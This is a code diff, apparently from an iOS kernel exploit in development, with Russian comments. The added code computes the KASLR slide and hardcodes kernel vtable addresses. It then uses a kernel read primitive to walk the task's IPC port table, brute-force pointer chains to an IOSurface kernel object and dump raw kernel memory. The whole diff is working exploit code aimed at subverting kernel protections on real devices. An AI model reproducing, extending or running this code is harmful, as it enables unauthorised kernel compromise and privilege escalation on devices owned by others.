@@ -5849,35 +5849,112 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     int slotForm[8] = {0};
     int nSlots = 0;
     if (isTable && dstS) {
+        // 1.9.144: vtable-карта ВСЕХ портов задачи + brute-force обоих
+        // экстракторов (SendRight→поле→surf; RootUC→[+0xe8]→coll→arr[dstID])
+        // с верификацией [X+0x10]==dstID (раунд 26: SendRight vt file 0x7eef568,
+        // поле +0x18; RootUC 0x7eed8f0; Root 0x7eed2f8; surfaceID @ +0x10).
+        uint64_t kslide = kconstant(base) - 0xfffffff007004000ULL;
+        uint64_t vtSendRight = 0xfffffff007eef568ULL + kslide;
+        uint64_t vtRootUC    = 0xfffffff007eed8f0ULL + kslide;
+        uint64_t vtRoot      = 0xfffffff007eed2f8ULL + kslide;
+        uint64_t (^resolveKobj)(uint32_t) = ^uint64_t(uint32_t nm) {
+            if (!nm) return (uint64_t)0;
+            uint64_t eVA = isTable + (uint64_t)sizeof_ipc_entry * (nm >> 8);
+            uint64_t oRaw = early_kread64(eVA + off_ipc_entry_ie_object);
+            uint64_t pVA = kp_untag_ptr(oRaw);
+            if (!kpLooksLikeKernelPointer(pVA)) return (uint64_t)0;
+            uint64_t kRaw = early_kread64(pVA + off_ipc_port_ip_kobject);
+            uint64_t kobj = kp_untag_ptr(kRaw);
+            return kpLooksLikeKernelPointer(kobj) ? kobj : (uint64_t)0;
+        };
+        uint64_t (^surfFromSendRight)(uint64_t) = ^uint64_t(uint64_t kobj) {
+            if ((uint32_t)early_kread64(kobj + 0x10) == dstID) return kobj;
+            for (uint32_t o = 0; o < 0x100; o += 8) {
+                uint64_t c = kp_untag_ptr(early_kread64(kobj + o));
+                if (!kpLooksLikeKernelPointer(c)) continue;
+                if ((uint32_t)early_kread64(c + 0x10) == dstID) return c;
+            }
+            return (uint64_t)0;
+        };
+        uint64_t (^surfFromUC)(uint64_t) = ^uint64_t(uint64_t uc) {
+            uint64_t coll = kp_untag_ptr(early_kread64(uc + 0xe8));
+            if (!kpLooksLikeKernelPointer(coll)) return (uint64_t)0;
+            uint64_t cnt2 = early_kread64(coll + 0xd8);
+            uint64_t arr2 = kp_untag_ptr(early_kread64(coll + 0xd0));
+            if (!kpLooksLikeKernelPointer(arr2) || cnt2 <= dstID || cnt2 >= 0x200000) return (uint64_t)0;
+            uint64_t cand = kp_untag_ptr(early_kread64(arr2 + (uint64_t)dstID * 8));
+            if (!kpLooksLikeKernelPointer(cand)) return (uint64_t)0;
+            if ((uint32_t)early_kread64(cand + 0x10) != dstID) return (uint64_t)0;
+            return cand;
+        };
+        // smp: сырцовый дамп kobj — понять, почему 1.9.143 не нашла SendRight-поле
         typedef mach_port_t (*CreateMachPort_t)(IOSurfaceRef);
         static CreateMachPort_t pCreateMachPort = NULL;
         if (!pCreateMachPort)
             pCreateMachPort = (CreateMachPort_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
         mach_port_t smp = pCreateMachPort ? pCreateMachPort(dstS) : 0;
-        if (smp) {
-            uint64_t eVA = isTable + (uint64_t)sizeof_ipc_entry * (smp >> 8);
-            uint64_t oRaw = early_kread64(eVA + off_ipc_entry_ie_object);
-            uint64_t pVA = kp_untag_ptr(oRaw);
-            uint64_t kRaw = kpLooksLikeKernelPointer(pVA) ? early_kread64(pVA + off_ipc_port_ip_kobject) : 0;
-            uint64_t kobj = kp_untag_ptr(kRaw);
-            kpNote(r, [NSString stringWithFormat:@"  порт-маршрут: smp=0x%x eVA=%#llx port=%#llx kobj(SendRight)=%#llx",
-                      smp, (unsigned long long)eVA, (unsigned long long)pVA, (unsigned long long)kobj]);
-            if (kpLooksLikeKernelPointer(kobj)) {
-                if ((uint32_t)early_kread64(kobj + 0x10) == dstID) {
-                    surfVA = kobj;   // kobject — сам IOSurface, без SendRight-обёртки
-                    kpNote(r, @"  kobject == IOSurface напрямую");
-                } else {
-                    for (uint32_t o = 0; o < 0x100 && !surfVA; o += 8) {
-                        uint64_t c = kp_untag_ptr(early_kread64(kobj + o));
-                        if (!kpLooksLikeKernelPointer(c)) continue;
-                        if ((uint32_t)early_kread64(c + 0x10) != dstID) continue;
-                        surfVA = c;
-                        kpNote(r, [NSString stringWithFormat:@"  SendRight+0x%x → IOSurface %#llx ([+0x10]==dstID %u)",
-                                  o, (unsigned long long)c, dstID]);
+        uint64_t smpKobj = resolveKobj(smp);
+        uint64_t smpVt = smpKobj ? kp_untag_ptr(early_kread64(smpKobj)) : 0;
+        kpNote(r, [NSString stringWithFormat:@"  порт-маршрут: smp=0x%x kobj=%#llx vt=%#llx (file %#llx; SendRight ждём %#llx)",
+                  smp, (unsigned long long)smpKobj, (unsigned long long)smpVt,
+                  (unsigned long long)(smpVt ? smpVt - kslide : 0), (unsigned long long)vtSendRight]);
+        if (smpKobj) {
+            for (uint32_t o = 0; o < 0x28; o += 8) {
+                uint64_t q = early_kread64(smpKobj + o);
+                uint64_t u = kp_untag_ptr(q);
+                kpNote(r, [NSString stringWithFormat:@"    kobj+0x%02x: raw=%#018llx untag=%#018llx%@",
+                          o, (unsigned long long)q, (unsigned long long)u,
+                          kpLooksLikeKernelPointer(u)
+                            ? [NSString stringWithFormat:@" → [+0x10]=%#x", (uint32_t)early_kread64(u + 0x10)] : @""]);
+            }
+            surfVA = surfFromSendRight(smpKobj);
+            if (surfVA) kpNote(r, [NSString stringWithFormat:@"  ★ smp SendRight → IOSurface %#llx", (unsigned long long)surfVA]);
+        }
+        // enum всех портов задачи: перепись + оба экстрактора до первого хита
+        if (!surfVA) {
+            extern kern_return_t mach_port_names(mach_port_t, mach_port_name_t **, mach_msg_type_number_t *, mach_port_type_t **, mach_msg_type_number_t *);
+            mach_port_name_t *pnames = NULL;
+            mach_port_type_t *ptypes = NULL;
+            mach_msg_type_number_t pcnt = 0, ptcnt = 0;
+            if (mach_port_names(mach_task_self(), &pnames, &pcnt, &ptypes, &ptcnt) == KERN_SUCCESS && pnames) {
+                kpNote(r, [NSString stringWithFormat:@"  enum портов: %u имён — vtable-перепись и brute-force:", pcnt]);
+                uint64_t seen[256];
+                int nSeen = 0, nPrinted = 0;
+                for (uint32_t i = 0; i < pcnt && i < 1024; i++) {
+                    uint64_t kobj = resolveKobj(pnames[i]);
+                    if (!kobj) continue;
+                    BOOL dupK = NO;
+                    for (int j = 0; j < nSeen; j++) if (seen[j] == kobj) { dupK = YES; break; }
+                    if (dupK) continue;
+                    if (nSeen < 256) seen[nSeen++] = kobj;
+                    uint64_t vt = kp_untag_ptr(early_kread64(kobj));
+                    const char *tag = vt == vtSendRight ? "SendRight" :
+                                      vt == vtRootUC    ? "RootUC"   :
+                                      vt == vtRoot      ? "Root"     : "";
+                    if (tag[0] || nPrinted < 48) {
+                        kpNote(r, [NSString stringWithFormat:@"    name=%#x kobj=%#llx vt(file)=%#llx %s",
+                                  pnames[i], (unsigned long long)kobj,
+                                  (unsigned long long)(vt - kslide), tag]);
+                        nPrinted++;
+                    }
+                    if (surfVA) continue;
+                    uint64_t s = surfFromSendRight(kobj);
+                    const char *how = "SendRight-поле";
+                    if (!s) { s = surfFromUC(kobj); how = "UC-цепочка"; }
+                    if (s) {
+                        surfVA = s;
+                        kpNote(r, [NSString stringWithFormat:@"  ★ enum: name=%#x kobj=%#llx vt(file)=%#llx — %s → IOSurface %#llx",
+                                  pnames[i], (unsigned long long)kobj,
+                                  (unsigned long long)(vt - kslide), how, (unsigned long long)s]);
                     }
                 }
+                mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)pnames, (mach_vm_size_t)pcnt * sizeof(mach_port_name_t));
+                if (ptypes) mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)ptypes, (mach_vm_size_t)ptcnt * sizeof(mach_port_type_t));
+            } else {
+                kpNote(r, @"  enum портов: mach_port_names не удался");
             }
-            if (surfVA) {
+        }
+        if (surfVA) {
                 uint64_t objs[3] = { surfVA, 0, 0 };
                 uint64_t ro = kp_untag_ptr(early_kread64(surfVA + 0x178));
                 if (kpLooksLikeKernelPointer(ro)) objs[1] = ro;
@@ -5930,12 +6007,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 } else {
                     kpNote(r, @"  порт-маршрут: IOSurface найден, но pfn-слотов нет — уходим в старые пути");
                 }
-            } else {
-                kpNote(r, @"  порт-маршрут: IOSurface через SendRight не найден — уходим в старые пути");
-            }
         } else {
-            kpNote(r, [NSString stringWithFormat:@"  порт-маршрут: IOSurfaceCreateMachPort %@ — уходим в старые пути",
-                      pCreateMachPort ? @"вернул 0" : @"не найден (dlsym)"]);
+            kpNote(r, @"  порт-маршрут: IOSurface не найден ни по одному порту задачи — уходим в старые пути");
         }
     }
     // 3. Trusted-path резолв surfVA через M2 async op-entry (1.9.124):
